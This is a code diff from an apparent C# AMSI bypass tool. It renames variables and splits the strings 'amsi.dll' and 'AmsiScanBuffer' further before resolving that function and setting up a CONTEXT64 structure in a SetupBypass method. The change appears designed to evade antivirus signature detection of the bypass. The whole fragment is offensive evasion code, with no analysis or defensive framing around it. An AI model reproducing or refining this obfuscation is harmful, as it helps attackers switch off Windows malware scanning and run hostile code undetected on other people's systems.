@@ -18,11 +18,11 @@ namespace Test
    
     public class Program
     {
-        static string a = "msi";
-        static string b = "anB";
-        static string c = "ff";
-        static IntPtr BaseAddress = WinAPI.LoadLibrary("a" + a + ".dll");
-        static IntPtr pABuF = WinAPI.GetProcAddress(BaseAddress, "A" + a + "Sc" + b + "u" + c + "er");
+        static string lemur = "msi";
+        static string wiggle = "anB";
+        static string coco = "ff";
+        static IntPtr BaseAddress = WinAPI.LoadLibrary("a" + lemur + ".dll");
+        static IntPtr pABuF = WinAPI.GetProcAddress(BaseAddress, "A" + lemur + "S" + "c" + wiggle + "u" + coco + "er");
         static IntPtr pCtx = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WinAPI.CONTEXT64)));
         
         public static void SetupBypass()
